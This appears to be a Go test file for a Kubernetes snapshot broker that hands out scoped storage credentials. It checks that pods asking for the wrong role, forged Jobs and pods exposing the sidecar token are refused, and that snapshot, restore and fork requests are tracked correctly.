package broker

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"golang.org/x/time/rate"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"net/http"
	"net/http/httptest"
	"slices"
	"testing"
	"time"

	"github.com/go-logr/logr"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
	"k8s.io/utils/ptr"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	wsnapv1 "github.com/chrisyifanjin/wsnap/api/v1alpha1"
	"github.com/chrisyifanjin/wsnap/internal/protocol"
	"github.com/chrisyifanjin/wsnap/internal/workspace"
)

// fakeAuth maps a token string to a pod identity.
type fakeAuth map[string]Identity

func (f fakeAuth) Authenticate(_ context.Context, token string) (Identity, error) {
	id, ok := f[token]
	if !ok {
		return Identity{}, fmt.Errorf("unknown token")
	}
	return id, nil
}

const ns = "team-a"

func workloadPod(name, uid, ws string, mutate ...func(*corev1.Pod)) *corev1.Pod {
	p := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name, UID: types.UID(uid),
			Labels: map[string]string{wsnapv1.LabelWorkspace: ws, wsnapv1.LabelRepository: "repo"}},
		Spec: corev1.PodSpec{
			AutomountServiceAccountToken: ptr.To(false),
			InitContainers: []corev1.Container{{Name: "wsnap", RestartPolicy: ptr.To(corev1.ContainerRestartPolicyAlways),
				VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}, {Name: "workspace", MountPath: "/workspace"}}}},
			Containers: []corev1.Container{{Name: "agent", VolumeMounts: []corev1.VolumeMount{{Name: "workspace", MountPath: "/workspace"}}}},
			Volumes: []corev1.Volume{
				{Name: "workspace", VolumeSource: corev1.VolumeSource{PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{ClaimName: "data-" + name}}},
				{Name: "wsnap-token", VolumeSource: corev1.VolumeSource{Projected: &corev1.ProjectedVolumeSource{Sources: []corev1.VolumeProjection{
					{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Audience: "wsnap", Path: "token"}}}}}},
			},
		},
	}
	// The kubelet reports Running once the Pod's sandbox is up, before
	// any container starts.
	p.Status.Phase = corev1.PodRunning
	for _, m := range mutate {
		m(p)
	}
	return p
}

func agentRunning(p *corev1.Pod) {
	p.Status.ContainerStatuses = []corev1.ContainerStatus{{Name: "agent", State: corev1.ContainerState{Running: &corev1.ContainerStateRunning{}}}}
}

type env struct {
	srv    *Server
	client client.Client
}

func newEnv(t *testing.T, objs ...client.Object) *env {
	t.Helper()
	// Fake clients do not run Kubernetes' PV binder. Give ordinary Pod
	// fixtures a real claim/PV identity so writer checks exercise production
	// bindings rather than an impossible running Pod with an unbound claim.
	claims := map[string]*corev1.PersistentVolumeClaim{}
	volumes := map[string]*corev1.PersistentVolume{}
	for _, o := range objs {
		switch v := o.(type) {
		case *corev1.PersistentVolumeClaim:
			claims[v.Name] = v
		case *corev1.PersistentVolume:
			volumes[v.Name] = v
		}
	}
	for _, o := range objs {
		p, ok := o.(*corev1.Pod)
		if !ok || p.Labels[wsnapv1.LabelWorkspace] == "" {
			continue
		}
		for _, v := range p.Spec.Volumes {
			if v.PersistentVolumeClaim == nil {
				continue
			}
			name := v.PersistentVolumeClaim.ClaimName
			if claims[name] == nil {
				claims[name] = &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: p.Namespace, Name: name},
					Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-" + name}}
				objs = append(objs, claims[name])
			}
		}
	}
	// Mover and restorer fixtures also need the PVC that a real Job Pod
	// mounts. The Job controller does not run in the fake client.
	for _, o := range objs {
		j, ok := o.(*batchv1.Job)
		if !ok || (j.Labels[wsnapv1.LabelJob] != "mover" && j.Labels[wsnapv1.LabelJob] != "restorer") {
			continue
		}
		if j.Annotations == nil {
			j.Annotations = map[string]string{}
		}
		pvName := j.Annotations[wsnapv1.AnnotationVolumeName]
		if pvName == "" {
			pvName = "pv-" + j.Name
			j.Annotations[wsnapv1.AnnotationVolumeName] = pvName
		}
		claimName := ""
		for _, v := range j.Spec.Template.Spec.Volumes {
			if v.Name == "workspace" && v.PersistentVolumeClaim != nil {
				claimName = v.PersistentVolumeClaim.ClaimName
			}
		}
		if claimName == "" {
			for _, pvc := range claims {
				if pvc.Spec.VolumeName == pvName {
					claimName = pvc.Name
					break
				}
			}
		}
		if claimName == "" {
			claimName = "job-claim-" + j.Name
		}
		if claims[claimName] == nil {
			claims[claimName] = &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: j.Namespace, Name: claimName},
				Spec: corev1.PersistentVolumeClaimSpec{VolumeName: pvName}}
			objs = append(objs, claims[claimName])
		}
		if volumes[pvName] == nil {
			volumes[pvName] = &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: pvName}}
			objs = append(objs, volumes[pvName])
		}
		pv := volumes[pvName]
		if pv.Annotations == nil {
			pv.Annotations = map[string]string{}
		}
		if pv.Annotations[wsnapv1.AnnotationWorkspaceRef] == "" && j.Labels[wsnapv1.LabelJobWorkspace] != "" {
			pv.Annotations[wsnapv1.AnnotationWorkspaceRef] = j.Namespace + "/" + j.Labels[wsnapv1.LabelJobWorkspace]
		}
		v := corev1.Volume{Name: "workspace", VolumeSource: corev1.VolumeSource{
			PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{ClaimName: claimName}}}
		found := false
		for _, existing := range j.Spec.Template.Spec.Volumes {
			found = found || existing.Name == "workspace"
		}
		if !found {
			j.Spec.Template.Spec.Volumes = append(j.Spec.Template.Spec.Volumes, v)
		}
		for _, other := range objs {
			p, ok := other.(*corev1.Pod)
			if !ok || metav1.GetControllerOf(p) == nil || metav1.GetControllerOf(p).UID != j.UID {
				continue
			}
			found := false
			for _, existing := range p.Spec.Volumes {
				found = found || existing.Name == "workspace"
			}
			if !found {
				p.Spec.Volumes = append(p.Spec.Volumes, v)
			}
		}
	}
	for _, pvc := range claims {
		if pvc.UID == "" {
			pvc.UID = types.UID("uid-" + pvc.Name)
		}
		if pvc.Spec.VolumeName == "" {
			continue
		}
		pv := volumes[pvc.Spec.VolumeName]
		if pv == nil {
			pv = &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: pvc.Spec.VolumeName},
				Spec: corev1.PersistentVolumeSpec{PersistentVolumeReclaimPolicy: corev1.PersistentVolumeReclaimDelete}}
			volumes[pv.Name] = pv
			objs = append(objs, pv)
		}
		if pv.UID == "" {
			pv.UID = types.UID("uid-" + pv.Name)
		}
		if pv.Spec.ClaimRef == nil {
			pv.Spec.ClaimRef = &corev1.ObjectReference{Namespace: pvc.Namespace, Name: pvc.Name, UID: pvc.UID}
		} else if pv.Spec.ClaimRef.Namespace == pvc.Namespace && pv.Spec.ClaimRef.Name == pvc.Name && pv.Spec.ClaimRef.UID == "" {
			pv.Spec.ClaimRef.UID = pvc.UID
		}
	}
	for _, o := range objs {
		j, ok := o.(*batchv1.Job)
		if !ok || (j.Labels[wsnapv1.LabelJob] != "mover" && j.Labels[wsnapv1.LabelJob] != "restorer") {
			continue
		}
		for _, v := range j.Spec.Template.Spec.Volumes {
			if v.Name == "workspace" && v.PersistentVolumeClaim != nil {
				j.Annotations[workspace.AnnotationClaimUID] = string(claims[v.PersistentVolumeClaim.ClaimName].UID)
				j.Annotations[workspace.AnnotationPVUID] = string(volumes[j.Annotations[wsnapv1.AnnotationVolumeName]].UID)
			}
		}
	}
	for _, o := range objs {
		ws, ok := o.(*wsnapv1.Workspace)
		if !ok {
			continue
		}
		for i := range ws.Status.Jobs {
			for _, other := range objs {
				j, ok := other.(*batchv1.Job)
				if ok && ws.Status.Jobs[i].UID == string(j.UID) {
					ws.Status.Jobs[i] = workspace.JobRef(j)
				}
			}
		}
	}
	scheme := runtime.NewScheme()
	_ = clientgoscheme.AddToScheme(scheme)
	_ = wsnapv1.AddToScheme(scheme)
	base := []client.Object{
		&wsnapv1.SnapshotRepository{
			ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "repo"},
			Spec: wsnapv1.SnapshotRepositorySpec{
				Engine:      wsnapv1.EngineSpec{Type: "restic"},
				Backend:     wsnapv1.BackendSpec{S3: &wsnapv1.S3Backend{Endpoint: "s3.example.com", Bucket: "b", Prefix: "root"}},
				Credentials: wsnapv1.CredentialsSpec{SecretName: "creds", Provider: "static"},
			},
		},
		&corev1.Secret{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "creds"}, Data: map[string][]byte{
			"WSNAP_MASTER_KEY": []byte("0123456789abcdef0123"), "AWS_ACCESS_KEY_ID": []byte("AK"), "AWS_SECRET_ACCESS_KEY": []byte("SK"),
		}},
	}
	b := fake.NewClientBuilder().WithScheme(scheme).WithObjects(append(base, objs...)...).
		WithStatusSubresource(&wsnapv1.Workspace{}, &wsnapv1.WorkspaceSnapshot{}, &wsnapv1.WorkspaceRestore{})
	for _, ix := range workspace.Indexers() {
		b = b.WithIndex(ix.Obj, ix.Field, ix.Extract)
	}
	c := b.Build()
	auth := fakeAuth{}
	for _, o := range objs {
		if p, ok := o.(*corev1.Pod); ok {
			auth["token-"+p.Name] = Identity{Namespace: p.Namespace, ServiceAccount: "default", PodName: p.Name, PodUID: string(p.UID)}
		}
	}
	auth["token-stale"] = Identity{Namespace: ns, PodName: "w1", PodUID: "old-uid"}
	return &env{client: c, srv: &Server{Client: c, Reader: c, Auth: auth, Audience: "wsnap", Log: logr.Discard()}}
}

func (e *env) call(t *testing.T, path, token string, body any) (*httptest.ResponseRecorder, *protocol.CredentialsResponse) {
	t.Helper()
	b, _ := json.Marshal(body)
	req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(b))
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	rec := httptest.NewRecorder()
	e.srv.Handler().ServeHTTP(rec, req)
	var resp protocol.CredentialsResponse
	if rec.Code == http.StatusOK {
		_ = json.Unmarshal(rec.Body.Bytes(), &resp)
	}
	return rec, &resp
}

func TestRoles(t *testing.T) {
	cases := []struct {
		name  string
		pod   *corev1.Pod
		token string
		role  protocol.Role
		want  int
	}{
		{"restore before workload starts", workloadPod("w1", "u1", "ws1"), "token-w1", protocol.RoleRestore, 200},
		{"restore after workload starts", workloadPod("w1", "u1", "ws1", agentRunning), "token-w1", protocol.RoleRestore, 403},
		{"snapshot while running", workloadPod("w1", "u1", "ws1", agentRunning), "token-w1", protocol.RoleSnapshot, 200},
		{"workload asks for maintenance", workloadPod("w1", "u1", "ws1"), "token-w1", protocol.RoleMaintenance, 403},
		{"workload asks for mover", workloadPod("w1", "u1", "ws1"), "token-w1", protocol.RoleMover, 403},
		{"no token", workloadPod("w1", "u1", "ws1"), "", protocol.RoleSnapshot, 401},
		{"token of an earlier pod with the same name", workloadPod("w1", "u1", "ws1"), "token-stale", protocol.RoleSnapshot, 403},
		{"pod without workspace label", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { delete(p.Labels, wsnapv1.LabelWorkspace) }), "token-w1", protocol.RoleSnapshot, 403},
		{"workload container mounts the wsnap token", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) {
			p.Spec.Containers[0].VolumeMounts = append(p.Spec.Containers[0].VolumeMounts, corev1.VolumeMount{Name: "wsnap-token", MountPath: "/stolen"})
		}), "token-w1", protocol.RoleSnapshot, 403},
		{"pod shares its process namespace", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { p.Spec.ShareProcessNamespace = ptr.To(true) }), "token-w1", protocol.RoleSnapshot, 403},
		{"debug container targets the sidecar", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) {
			p.Spec.EphemeralContainers = []corev1.EphemeralContainer{{TargetContainerName: "wsnap", EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "dbg"}}}
		}), "token-w1", protocol.RoleSnapshot, 403},
		{"pod mounts the default API token", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { p.Spec.AutomountServiceAccountToken = nil }), "token-w1", protocol.RoleSnapshot, 403},
		{"pod claims to be a mover without a Job", workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { p.Labels[wsnapv1.LabelJob] = "mover" }), "token-w1", protocol.RoleMover, 403},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := newEnv(t, tc.pod)
			rec, _ := e.call(t, "/v1/credentials", tc.token, protocol.CredentialsRequest{Role: tc.role})
			if rec.Code != tc.want {
				t.Fatalf("status %d, want %d: %s", rec.Code, tc.want, rec.Body.String())
			}
		})
	}
}

func TestCredentialsResponse(t *testing.T) {
	pv := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-1"},
		Spec: corev1.PersistentVolumeSpec{PersistentVolumeReclaimPolicy: corev1.PersistentVolumeReclaimDelete}}
	pvc := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-w1"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-1"}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), workloadPod("w2", "u2", "ws2"), pv, pvc)

	rec, r1 := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	if rec.Code != 200 {
		t.Fatalf("status %d: %s", rec.Code, rec.Body.String())
	}
	if got := r1.Backend.S3.Prefix; got != "root/team-a/ws1" {
		t.Errorf("prefix = %q, want root/team-a/ws1", got)
	}
	if r1.Credentials.Scoped {
		t.Error("static credential reported as scoped")
	}
	_, r2 := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	if r1.RepositoryPassword == r2.RepositoryPassword {
		t.Error("two workspaces got the same repository password")
	}

	// The broker created the Workspace and protected the PV.
	var ws wsnapv1.Workspace
	if err := e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws); err != nil {
		t.Fatalf("workspace not created: %v", err)
	}
	if ws.Status.WriterPod == nil || ws.Status.WriterPod.UID != "u1" {
		t.Errorf("writerPod = %+v", ws.Status.WriterPod)
	}
	var got corev1.PersistentVolume
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "pv-1"}, &got)
	if got.Spec.PersistentVolumeReclaimPolicy != corev1.PersistentVolumeReclaimRetain {
		t.Errorf("PV reclaim policy = %s, want Retain", got.Spec.PersistentVolumeReclaimPolicy)
	}
	if got.Annotations[wsnapv1.AnnotationOriginalReclaimPolicy] != "Delete" || got.Annotations[workspace.AnnotationWriterPod] != "u1" {
		t.Errorf("PV annotations = %v", got.Annotations)
	}

	// A final snapshot report marks the PV.
	rep := protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s1", Final: true}
	if rec, _ := e.call(t, "/v1/report", "token-w1", rep); rec.Code != http.StatusNoContent {
		t.Fatalf("report status %d: %s", rec.Code, rec.Body.String())
	}
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "pv-1"}, &got)
	if got.Annotations[workspace.AnnotationFinalPod] != "u1" {
		t.Errorf("final-pod annotation = %q, want u1", got.Annotations[workspace.AnnotationFinalPod])
	}
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
	if ws.Status.LastSnapshot == nil || ws.Status.LastSnapshot.ID != "s1" || !ws.Status.LastSnapshot.Final {
		t.Errorf("lastSnapshot = %+v", ws.Status.LastSnapshot)
	}
}

func TestJobRoles(t *testing.T) {
	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-mover-x", UID: "job-uid",
			Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "mover",
				wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"}},
		Spec: batchv1.JobSpec{BackoffLimit: ptr.To[int32](3)},
	}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "mover-pod", UID: "mp",
		Labels:          map[string]string{wsnapv1.LabelJob: "mover"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-mover-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	e := newEnv(t, job, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-mover-x", UID: "job-uid", Kind: "mover"}}}})
	if rec, r := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != 200 || r.Workspace != "ws1" {
		t.Fatalf("mover: status %d, workspace %q: %s", rec.Code, r.Workspace, rec.Body.String())
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMaintenance}); rec.Code != 403 {
		t.Errorf("mover pod got maintenance: %d", rec.Code)
	}
	// Replacing the mounted claim under the same name invalidates the
	// registered Job's credential, even though its template still matches.
	claimName := job.Spec.Template.Spec.Volumes[0].PersistentVolumeClaim.ClaimName
	var mounted corev1.PersistentVolumeClaim
	if err := e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: claimName}, &mounted); err != nil {
		t.Fatal(err)
	}
	mounted.UID = "replacement-claim"
	if err := e.client.Update(context.Background(), &mounted); err != nil {
		t.Fatal(err)
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != http.StatusForbidden {
		t.Fatalf("replacement claim got a mover credential: %d %s", rec.Code, rec.Body.String())
	}
	var edited batchv1.Job
	if err := e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: job.Name}, &edited); err != nil {
		t.Fatal(err)
	}
	edited.Annotations[workspace.AnnotationClaimUID] = string(mounted.UID)
	if err := e.client.Update(context.Background(), &edited); err != nil {
		t.Fatal(err)
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != http.StatusForbidden {
		t.Fatalf("edited Job annotation bypassed the status registration: %d %s", rec.Code, rec.Body.String())
	}

	// A user-made Job that copies the labels but lacks managed-by.
	forged := job.DeepCopy()
	forged.Name, forged.UID = "forged", "forged-uid"
	delete(forged.Labels, wsnapv1.LabelManagedBy)
	fpod := pod.DeepCopy()
	fpod.Name, fpod.UID = "forged-pod", "fp"
	fpod.OwnerReferences[0].Name, fpod.OwnerReferences[0].UID = "forged", "forged-uid"
	e = newEnv(t, forged, fpod)
	if rec, _ := e.call(t, "/v1/credentials", "token-forged-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != 403 {
		t.Errorf("forged job got a credential: %d", rec.Code)
	}
}

func TestServiceAccountAutomountFalseIsAccepted(t *testing.T) {
	pod := workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { p.Spec.AutomountServiceAccountToken = nil; p.Spec.ServiceAccountName = "agents" })
	sa := &corev1.ServiceAccount{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "agents"}, AutomountServiceAccountToken: ptr.To(false)}
	e := newEnv(t, pod, sa)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("status %d: %s", rec.Code, rec.Body.String())
	}
}

func TestSingleWriter(t *testing.T) {
	old := workloadPod("w1", "u1", "ws1", agentRunning)
	newer := workloadPod("w2", "u2", "ws1")
	e := newEnv(t, old, newer)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("first writer: %d %s", rec.Code, rec.Body.String())
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("second live writer got %d, want 409", rec.Code)
	}
	// The old writer is terminating: it may still take its final snapshot.
	var p corev1.Pod
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "w1"}, &p)
	p.Status.Phase = corev1.PodFailed
	_ = e.client.Status().Update(context.Background(), &p)
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("after the old writer stopped: %d %s", rec.Code, rec.Body.String())
	}
}

func TestRestoreWaitsForPendingRescue(t *testing.T) {
	released := &corev1.PersistentVolume{
		ObjectMeta: metav1.ObjectMeta{Name: "old-pv", Labels: map[string]string{wsnapv1.LabelProtected: "true"},
			Annotations: map[string]string{wsnapv1.AnnotationWorkspaceRef: ns + "/ws1", workspace.AnnotationWriterPod: "u0"}},
		Status: corev1.PersistentVolumeStatus{Phase: corev1.VolumeReleased},
	}
	e := newEnv(t, workloadPod("w2", "u2", "ws1"), released)
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("restore during a pending rescue got %d, want 409", rec.Code)
	}
	// Snapshots are not blocked, only restores.
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("snapshot blocked: %d", rec.Code)
	}
	var pv corev1.PersistentVolume
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "old-pv"}, &pv)
	pv.Annotations[wsnapv1.AnnotationRescue] = "done"
	_ = e.client.Update(context.Background(), &pv)
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("restore after the rescue: %d %s", rec.Code, rec.Body.String())
	}
}

func TestReusedFinalDoesNotCountTowardMaintenance(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s1"})
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s1", Final: true, Reused: true})
	var ws wsnapv1.Workspace
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
	if ws.Status.SnapshotsSinceMaintenance != 1 || !ws.Status.LastSnapshot.Final {
		t.Errorf("snapshotsSinceMaintenance=%d final=%v, want 1 and true", ws.Status.SnapshotsSinceMaintenance, ws.Status.LastSnapshot.Final)
	}
}

func TestRateLimit(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	e.srv.Limiter = &PodLimiter{Rate: 0.001, Burst: 2}
	codes := []int{}
	for i := 0; i < 3; i++ {
		rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
		codes = append(codes, rec.Code)
	}
	if codes[0] != 200 || codes[1] != 200 || codes[2] != http.StatusTooManyRequests {
		t.Errorf("codes = %v, want [200 200 429]", codes)
	}
}

func forkEnv(t *testing.T, objs ...client.Object) *env {
	parent := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "parent"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"}}
	return newEnv(t, append(objs, parent)...)
}

func TestForkRestoreCredentials(t *testing.T) {
	child := &wsnapv1.Workspace{
		ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "child", Generation: 3},
		Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo",
			RestoreFrom: &wsnapv1.RestoreSource{WorkspaceName: "parent", SnapshotID: "abc"}},
	}
	e := forkEnv(t, workloadPod("w1", "u1", "child"), child)
	rec, r := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore})
	if rec.Code != 200 {
		t.Fatalf("status %d: %s", rec.Code, rec.Body.String())
	}
	if r.Backend.S3.Prefix != "root/team-a/parent" || r.SourceWorkspace != "parent" || r.SnapshotID != "abc" || r.RestoreFromGeneration != 3 {
		t.Fatalf("fork response = prefix %q source %q id %q gen %d", r.Backend.S3.Prefix, r.SourceWorkspace, r.SnapshotID, r.RestoreFromGeneration)
	}
	_, own := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	if own.Backend.S3.Prefix != "root/team-a/child" || own.SourceWorkspace != "" {
		t.Errorf("snapshot role must write the child's own repository, got %q", own.Backend.S3.Prefix)
	}
	if own.RepositoryPassword == r.RepositoryPassword {
		t.Error("fork restore must use the parent's password, not the child's")
	}

	// The restore report consumes restoreFrom for this generation.
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleRestore, Operation: protocol.OpRestore,
		SnapshotID: "abc", SourceWorkspace: "parent", RestoreFromGeneration: 3})
	_, again := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore})
	if again.SourceWorkspace != "" || again.SnapshotID != "" || again.Backend.S3.Prefix != "root/team-a/child" {
		t.Errorf("restoreFrom applied twice: %+v", again)
	}
	var ws wsnapv1.Workspace
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "child"}, &ws)
	if ws.Status.LastRestore == nil || ws.Status.LastRestore.SourceWorkspace != "parent" {
		t.Errorf("lastRestore = %+v", ws.Status.LastRestore)
	}
}

func TestForkFromMissingWorkspaceFails(t *testing.T) {
	// The API server starts metadata.generation at 1; the fake does not.
	child := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "child", Generation: 1},
		Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo", RestoreFrom: &wsnapv1.RestoreSource{WorkspaceName: "ghost"}}}
	e := newEnv(t, workloadPod("w1", "u1", "child"), child)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusFailedDependency {
		t.Fatalf("status %d, want 424", rec.Code)
	}
}

func TestWaitAndCompleteRequests(t *testing.T) {
	old := waitPoll
	waitPoll = 100 * time.Millisecond
	t.Cleanup(func() { waitPoll = old })
	req := func(name, wsName, phase string) *wsnapv1.WorkspaceSnapshot {
		return &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name},
			Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: wsName}, Status: wsnapv1.WorkspaceSnapshotStatus{Phase: phase}}
	}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), workloadPod("w2", "u2", "ws1"), workloadPod("o1", "uo", "other"),
		req("r1", "ws1", wsnapv1.SnapshotPending), req("r2", "ws1", ""), req("r3", "other", wsnapv1.SnapshotPending),
		req("done", "ws1", wsnapv1.SnapshotSucceeded))
	e.srv.Client = &statusCompat{e.client}
	// w1 becomes the writer.
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})

	wait := func(token string) []string {
		rec := httptest.NewRecorder()
		r := httptest.NewRequest(http.MethodPost, "/v1/wait", bytes.NewReader([]byte("{}")))
		r.Header.Set("Authorization", "Bearer "+token)
		e.srv.Handler().ServeHTTP(rec, r)
		var resp protocol.WaitResponse
		_ = json.Unmarshal(rec.Body.Bytes(), &resp)
		return resp.Requests
	}
	if got := wait("token-w2"); len(got) != 0 {
		t.Errorf("a non-writer pod received requests %v", got)
	}
	got := wait("token-w1")
	if len(got) != 2 {
		t.Fatalf("writer got %v, want r1 and r2 only", got)
	}
	// Claimed but maybe never delivered (a lost answer, a restarted
	// sidecar): the claimant gets them again until they complete
	// (reviewer #3 finding 5). The sidecar ignores names it serves.
	if again := wait("token-w1"); !slices.Equal(again, got) {
		t.Errorf("the claimant got %v again, want the same claims %v", again, got)
	}
	if got := wait("token-w2"); len(got) != 0 {
		t.Errorf("a claimed request went to another pod: %v", got)
	}
	var r1 wsnapv1.WorkspaceSnapshot
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "r1"}, &r1)
	if r1.Status.Phase != wsnapv1.SnapshotRunning {
		t.Errorf("r1 phase %q, want Running", r1.Status.Phase)
	}

	// Success, failure, and a request of another workspace.
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s9", Request: "r1"})
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, Error: "disk on fire", Request: "r2"})
	if rec, _ := e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s9", Request: "r3"}); rec.Code != http.StatusForbidden {
		t.Errorf("completing another workspace's request: %d, want 403", rec.Code)
	}
	check := func(name, phase, id string) {
		var r wsnapv1.WorkspaceSnapshot
		_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: name}, &r)
		if r.Status.Phase != phase || r.Status.SnapshotID != id {
			t.Errorf("%s = %s/%q, want %s/%q", name, r.Status.Phase, r.Status.SnapshotID, phase, id)
		}
	}
